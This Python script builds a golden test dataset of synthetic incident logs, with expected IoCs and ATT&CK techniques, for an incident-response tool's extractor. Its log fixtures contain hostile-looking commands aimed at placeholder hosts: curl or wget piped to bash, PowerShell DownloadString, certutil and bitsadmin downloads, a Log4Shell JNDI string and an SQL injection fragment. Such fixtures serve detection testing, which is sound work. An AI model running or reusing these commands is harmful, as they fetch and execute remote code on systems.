"""Generate tests/golden/dataset.json (N>=30) with curated expected IoCs/techniques.

Gold labels are **explicit** in scenario templates (analyst-intended), not silently
copied from the live extractor. On each build we still *validate* that
``extract_iocs`` / ``infer_techniques`` match gold so CI stays honest about drift.

Run from backend/:
  python tests/golden/build_dataset.py
  python tests/golden/build_dataset.py --check   # validate only, no write
"""
from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path
from typing import Any, Dict, List, Optional, Sequence, Tuple

BACKEND = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(BACKEND))

from backend.ioc_extractor import extract_iocs  # noqa: E402
from backend.knowledge_base import infer_techniques  # noqa: E402

REQUIRED_PHASES = ["containment", "eradication", "recovery", "lessons_learned"]
DATASET_VERSION = 2


def _ioc(type_: str, value: str) -> Dict[str, str]:
    return {"type": type_, "value": value}


def _case(
        name: str,
        log: str,
        technique_ids: Sequence[str],
        iocs: Sequence[Dict[str, str]],
        *,
        family: str,
        notes: str = "",
        min_grounding: float = 0.5,
) -> dict:
    """Build one golden fixture with explicit curated labels."""
    return {
        "name": name,
        "family": family,
        "log": log,
        "label_source": "curated_v1",
        "notes": notes,
        "expected": {
            "iocs": [dict(x) for x in iocs],
            "technique_ids": list(technique_ids),
            "playbook_phases": list(REQUIRED_PHASES),
            "min_grounding": min_grounding,
        },
    }


def _ssh(name: str, ip: str, family: str = "ssh_bruteforce") -> dict:
    return _case(
        name,
        (
            f"Jan 12 10:00:01 web01 sshd[1023]: Failed password for root from {ip} port 45322 ssh2\n"
            f"Jan 12 10:00:02 web01 sshd[1024]: Failed password for admin from {ip} port 45325 ssh2\n"
            f"Jan 12 10:00:03 web01 sshd[1025]: authentication failure for invalid user oracle from {ip}\n"
        ),
        ["T1110"],
        [_ioc("ip", ip)],
        family=family,
        notes="SSH brute-force pattern; public source IP only.",
    )


def build_templates() -> list[dict]:
    """Curated IR scenarios — rebalanced families (fewer near-duplicate SSH clones)."""
    t: list[dict] = []

    # --- Credential access / auth (4 SSH + variants, not 10 clones) ---
    for i, ip in enumerate(["185.220.101.45", "185.220.101.46", "198.51.100.10", "203.0.113.20"], 1):
        t.append(_ssh(f"ssh_bruteforce_{i:02d}", ip))

    t.append(
        _case(
            "brute_variant_a",
            "auth: login failed for user admin from 203.0.113.77 — brute force watch\n",
            ["T1110"],
            [_ioc("ip", "203.0.113.77")],
            family="brute_force",
        )
    )
    t.append(
        _case(
            "brute_variant_b",
            "vpn: Failed login for user bob from 198.51.100.33 after invalid user attempts\n",
            ["T1110"],
            [_ioc("ip", "198.51.100.33")],
            family="brute_force",
        )
    )
    t.append(
        _case(
            "internal_noise_01",
            (
                "sshd: Failed password for root from 10.0.0.5 port 22\n"
                "sshd: Failed password for root from 8.8.8.8 port 22\n"
            ),
            ["T1110"],
            [_ioc("ip", "8.8.8.8")],
            family="noise_filter",
            notes="Private 10.x must not appear as IoC; only public 8.8.8.8.",
        )
    )
    t.append(
        _case(
            "success_login_01",
            (
                "sshd: Accepted password for alice from 203.0.113.10 port 22 ssh2 - "
                "successful login user logged on\n"
            ),
            ["T1078"],
            [_ioc("ip", "203.0.113.10")],
            family="valid_accounts",
        )
    )
    t.append(
        _case(
            "cloud_mfa_gap_01",
            (
                "auth: successful login user logged on ConsoleLogin without MFA from 203.0.113.40; "
                "failed password attempts earlier brute force from same IP\n"
            ),
            ["T1078", "T1110"],
            [_ioc("ip", "203.0.113.40")],
            family="cloud_auth",
            notes="Valid account + brute keywords; synthetic cloud-style auth log.",
        )
    )
    t.append(
        _case(
            "kerberos_brute_01",
            (
                "Security Event 4769 Kerberos TGS ticket brute force watch login failed for "
                "service account from 198.51.100.55\n"
            ),
            ["T1110"],
            [_ioc("ip", "198.51.100.55")],
            family="credential_access",
        )
    )

    # --- Exploit / public-facing ---
    t.append(
        _case(
            "log4shell_01",
            (
                "Jan 12 10:01:00 web01 java[2001]: WARN ${jndi:ldap://45.83.192.10/a} - Log4Shell CVE-2021-44228\n"
                "Jan 12 10:01:12 web01 java[2001]: RCE via jndi:ldap http://malicious-cdn.example.org/payload.jar\n"
                "Jan 12 10:01:15 web01 bash[2100]: curl http://malicious-cdn.example.org/payload.sh -o /tmp/x.sh\n"
            ),
            ["T1190", "T1105", "T1059"],
            [
                _ioc("ip", "45.83.192.10"),
                _ioc("cve", "CVE-2021-44228"),
                _ioc("url", "http://malicious-cdn.example.org/payload.jar"),
                _ioc("url", "http://malicious-cdn.example.org/payload.sh"),
            ],
            family="log4shell",
            notes="CISA KEV-style Log4Shell; no file-basename domains in gold.",
        )
    )
    t.append(
        _case(
            "log4shell_02",
            (
                "Mar 3 09:00:00 app02 java: jndi:ldap://198.51.100.77/Exploit CVE-2021-44228 log4j\n"
                "Mar 3 09:00:05 app02 bash: wget http://evil-payloads.example.net/a.sh\n"
            ),
            ["T1190", "T1105", "T1059"],
            [
                _ioc("ip", "198.51.100.77"),
                _ioc("cve", "CVE-2021-44228"),
                _ioc("url", "http://evil-payloads.example.net/a.sh"),
            ],
            family="log4shell",
        )
    )
    t.append(
        _case(
            "sqli_01",
            (
                "WAF: SQL injection attempt CVE-2023-34362 on /api/search?q=1' OR 1=1-- from 198.51.100.20\n"
            ),
            ["T1190"],
            [_ioc("ip", "198.51.100.20"), _ioc("cve", "CVE-2023-34362")],
            family="exploit",
            notes="MOVEit-era CVE string; exploit public-facing app.",
        )
    )
    t.append(
        _case(
            "xss_probe_01",
            (
                "WAF: xss probe script on /search from 192.0.2.88; also sql injection keyword union select\n"
            ),
            ["T1190"],
            [_ioc("ip", "192.0.2.88")],
            family="exploit",
        )
    )
    t.append(
        _case(
            "proxyshell_01",
            (
                "WAF: proxyshell CVE-2021-34473 exploit public-facing OWA from 198.51.100.77 "
                "webshell.aspx sql injection\n"
            ),
            ["T1190"],
            [_ioc("ip", "198.51.100.77"), _ioc("cve", "CVE-2021-34473")],
            family="exploit",
            notes="Synthetic Exchange/ProxyShell-style line (CISA KEV theme).",
        )
    )

    # --- Phishing / email ---
    t.append(
        _case(
            "phishing_01",
            (
                "smtp mailgate: suspicious email attachment phishing from attacker@evil-mail.example.com "
                "to user@corp.example.com\n"
                "Subject: invoice.pdf.exe - phishing campaign\n"
            ),
            ["T1566"],
            [
                _ioc("email", "attacker@evil-mail.example.com"),
                _ioc("email", "user@corp.example.com"),
                _ioc("domain", "evil-mail.example.com"),
                _ioc("domain", "corp.example.com"),
            ],
            family="phishing",
            notes="invoice.pdf.exe must not be gold domain (filename FP).",
        )
    )
    t.append(
        _case(
            "email_cve_01",
            (
                "mail: phishing email with link http://phish.example.org/login "
                "from spoof@bad.example.org CVE-2024-21413\n"
            ),
            ["T1566", "T1190"],
            [
                _ioc("url", "http://phish.example.org/login"),
                _ioc("cve", "CVE-2024-21413"),
                _ioc("email", "spoof@bad.example.org"),
                _ioc("domain", "bad.example.org"),
            ],
            family="phishing",
        )
    )
    t.append(
        _case(
            "oauth_phishing_01",
            (
                "IdP: suspicious email oauth consent phishing from grant@evil-mail.example.com "
                "smtp to user@corp.example.com attachment none\n"
            ),
            ["T1566"],
            [
                _ioc("email", "grant@evil-mail.example.com"),
                _ioc("email", "user@corp.example.com"),
                _ioc("domain", "evil-mail.example.com"),
                _ioc("domain", "corp.example.com"),
            ],
            family="phishing",
        )
    )
    t.append(
        _case(
            "office_macro_01",
            (
                "EDR: WINWORD.EXE spawned powershell -enc from macro Document1.docm phishing attachment; "
                "network download http://macro-c2.example.com/p.ps1\n"
            ),
            ["T1566", "T1059", "T1105", "T1071"],
            [_ioc("url", "http://macro-c2.example.com/p.ps1")],
            family="phishing",
            notes="Macro + download; basename domains excluded from gold.",
        )
    )

    # --- Execution / transfer / C2 ---
    t.append(
        _case(
            "powershell_download_01",
            (
                "EventID 4104 powershell: IEX DownloadString http://c2.badactor.example.com/s.ps1\n"
                "cmd.exe /c certutil -urlcache -split -f http://c2.badactor.example.com/p.bin C:\\Windows\\Temp\\p.bin\n"
                "hash sha256: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n"
            ),
            ["T1059", "T1105", "T1071"],
            [
                _ioc("url", "http://c2.badactor.example.com/s.ps1"),
                _ioc("url", "http://c2.badactor.example.com/p.bin"),
                _ioc(
                    "hash_sha256",
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                ),
            ],
            family="execution_transfer",
        )
    )
    t.append(
        _case(
            "wget_malware_01",
            (
                "bash: wget http://cdn-drop.example.com/m.bin -O /tmp/m; "
                "md5 44d88612fea8a8f36de82e1278abb02f\n"
            ),
            ["T1105", "T1059"],
            [
                _ioc("url", "http://cdn-drop.example.com/m.bin"),
                _ioc("hash_md5", "44d88612fea8a8f36de82e1278abb02f"),
            ],
            family="execution_transfer",
        )
    )
    t.append(
        _case(
            "bitsadmin_01",
            (
                "cmd.exe bitsadmin /transfer job http://dl.attacker.example.org/x.exe "
                "C:\\Users\\Public\\x.exe download\n"
            ),
            ["T1105", "T1059"],
            [_ioc("url", "http://dl.attacker.example.org/x.exe")],
            family="execution_transfer",
        )
    )
    t.append(
        _case(
            "download_curl_02",
            "cron: curl http://upd.malware.example.com/agent -o /var/tmp/a; bash /var/tmp/a\n",
            ["T1105", "T1059", "T1053"],
            [_ioc("url", "http://upd.malware.example.com/agent")],
            family="execution_transfer",
        )
    )
    t.append(
        _case(
            "multi_hash_01",
            (
                "sandbox: sample sha1 da39a3ee5e6b4b0d3255bfef95601890afd80709 "
                "dropped after curl http://h.example.org/a\n"
            ),
            # curl alone → T1105; no powershell/cmd/bash keywords for T1059
            ["T1105"],
            [
                _ioc("url", "http://h.example.org/a"),
                _ioc("hash_sha1", "da39a3ee5e6b4b0d3255bfef95601890afd80709"),
            ],
            family="execution_transfer",
        )
    )
    t.append(
        _case(
            "supply_chain_01",
            (
                "CI: npm postinstall curl http://supply.example.org/hook.sh | bash; "
                "download malware sha256 bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n"
            ),
            ["T1105", "T1059"],
            [
                _ioc("url", "http://supply.example.org/hook.sh"),
                _ioc(
                    "hash_sha256",
                    "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
                ),
            ],
            family="supply_chain",
            notes="Synthetic npm postinstall / supply-chain theme.",
        )
    )
    t.append(
        _case(
            "c2_beacon_01",
            (
                "proxy: C2 beacon http post to http://callback.malware.example.org/gate "
                "user-agent: Beacon/4.0\n"
                "destination 45.33.32.156\n"
            ),
            ["T1071"],
            [
                _ioc("url", "http://callback.malware.example.org/gate"),
                _ioc("ip", "45.33.32.156"),
            ],
            family="c2",
        )
    )
    t.append(
        _case(
            "dns_c2_01",
            (
                "proxy: C2 beacon DNS tunneling long query to exfil.evil.example.com user-agent bad; "
                "destination 45.33.32.200\n"
            ),
            ["T1071"],
            [
                _ioc("domain", "exfil.evil.example.com"),
                _ioc("ip", "45.33.32.200"),
            ],
            family="c2",
        )
    )
    t.append(
        _case(
            "mixed_brute_c2_01",
            (
                "sshd: Failed password for root from 91.240.118.172\n"
                "proxy: beacon callback C2 to 91.240.118.172 user-agent evil\n"
            ),
            ["T1110", "T1071"],
            [_ioc("ip", "91.240.118.172")],
            family="multi_technique",
        )
    )

    # --- Persistence / lateral / impact / recon ---
    t.append(
        _case(
            "cron_persist_01",
            (
                "audit: schtasks /create /tn Updater /tr C:\\Temp\\b.exe; cron entry * * * * * /tmp/backdoor\n"
                "bash: /bin/sh -c curl http://persist.example.org/i.sh | bash\n"
            ),
            ["T1053", "T1105", "T1059"],
            [_ioc("url", "http://persist.example.org/i.sh")],
            family="persistence",
        )
    )
    t.append(
        _case(
            "scheduled_at_01",
            (
                "windows: at.exe 14:00 cmd.exe /c powershell -enc ZQBjAGgAbwA= scheduled task persistence\n"
            ),
            ["T1053", "T1059"],
            [],
            family="persistence",
            notes="No network IoCs expected; technique keywords only.",
        )
    )
    t.append(
        _case(
            "lateral_psexec_01",
            (
                "windows: cmd.exe psexec lateral movement; accepted password successful login "
                "user logged on from 198.51.100.90\n"
            ),
            ["T1059", "T1078"],
            [_ioc("ip", "198.51.100.90")],
            family="lateral",
        )
    )
    t.append(
        _case(
            "ransomware_01",
            (
                "EDR: ransomware note README.txt dropped; files encrypted with .locked extension on host FS01\n"
                "user-agent: EvilCrypt/1.0 beacon callback to 203.0.113.50\n"
            ),
            ["T1486", "T1071"],
            [_ioc("ip", "203.0.113.50")],
            family="ransomware",
            notes="readme.txt must not be treated as domain IoC.",
        )
    )
    t.append(
        _case(
            "ransomware_02",
            (
                "EDR: ransomware .enc files on FS02; README.txt ransom note; beacon callback C2 to 203.0.113.60\n"
            ),
            ["T1486", "T1071"],
            [_ioc("ip", "203.0.113.60")],
            family="ransomware",
        )
    )
    t.append(
        _case(
            "portscan_01",
            (
                "ids: port scan detected from 203.0.113.99 using nmap; masscan signatures; "
                "connection refused on 22/tcp\n"
            ),
            ["T1046"],
            [_ioc("ip", "203.0.113.99")],
            family="discovery",
        )
    )
    t.append(
        _case(
            "masscan_02",
            (
                "netflow: masscan from 198.51.100.200; port scan of external hosts; connection refused floods\n"
            ),
            ["T1046"],
            [_ioc("ip", "198.51.100.200")],
            family="discovery",
        )
    )

    out = []
    for idx, c in enumerate(t, 1):
        c = dict(c)
        c["id"] = f"g{idx:03d}"
        out.append(c)
    return out


def _ioc_keyset(items: Sequence[Dict[str, Any]]) -> set[Tuple[str, str]]:
    return {((i.get("type") or "").lower(), (i.get("value") or "").strip().lower()) for i in items}


def validate_case(case: dict) -> List[str]:
    """Return human-readable mismatches vs live extractor / technique inferencer."""
    errs: List[str] = []
    log = case.get("log") or ""
    exp = case.get("expected") or {}
    gold = _ioc_keyset(exp.get("iocs") or [])
    pred_iocs = extract_iocs(log)
    pred = _ioc_keyset([{"type": i.type, "value": i.value} for i in pred_iocs])
    if gold != pred:
        only_gold = sorted(gold - pred)
        only_pred = sorted(pred - gold)
        if only_gold:
            errs.append(f"IoC gold-not-pred: {only_gold}")
        if only_pred:
            errs.append(f"IoC pred-not-gold: {only_pred}")

    gold_tech = {str(x).upper() for x in (exp.get("technique_ids") or [])}
    pred_tech = {t["technique_id"].upper() for t in infer_techniques(log, pred_iocs)}
    missing = sorted(gold_tech - pred_tech)
    if missing:
        errs.append(f"techniques missing from infer: {missing} (pred={sorted(pred_tech)})")
    return errs


def validate_all(cases: Sequence[dict]) -> List[str]:
    lines: List[str] = []
    for c in cases:
        for e in validate_case(c):
            lines.append(f"{c.get('id')} {c.get('name')}: {e}")
    return lines


def main(argv: Optional[Sequence[str]] = None) -> int:
    parser = argparse.ArgumentParser(description="Build/validate golden IR dataset")
    parser.add_argument(
        "--check",
        action="store_true",
        help="Validate gold vs extractor only; do not write dataset.json",
    )
    args = parser.parse_args(list(argv) if argv is not None else None)

    cases = build_templates()
    if len(cases) < 30:
        print(f"ERROR: need >=30 cases, got {len(cases)}", file=sys.stderr)
        return 2

    mismatches = validate_all(cases)
    if mismatches:
        print("Gold vs live pipeline mismatches:", file=sys.stderr)
        for m in mismatches:
            print(" ", m, file=sys.stderr)
        print(
            "Fix explicit gold in build_templates() or adjust extractor/keywords.",
            file=sys.stderr,
        )
        return 1

    families: Dict[str, int] = {}
    for c in cases:
        families[c.get("family") or "unknown"] = families.get(c.get("family") or "unknown", 0) + 1

    if args.check:
        print(f"OK n={len(cases)} families={dict(sorted(families.items()))}")
        return 0

    payload = {
        "version": DATASET_VERSION,
        "description": (
            "ACTIRA golden IR dataset v2 — curated synthetic fixtures for offline CI "
            "(template playbook path). Labels are explicit; build validates against extractor."
        ),
        "label_policy": (
            "expected.iocs/technique_ids are analyst-curated in build_dataset.py. "
            "File-like false domains are excluded. Not production telemetry; not licensed "
            "third-party PCAP/EVTX."
        ),
        "families": dict(sorted(families.items())),
        "cases": cases,
    }
    out_path = Path(__file__).resolve().parent / "dataset.json"
    out_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    print(f"wrote {out_path} n={len(cases)} families={len(families)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
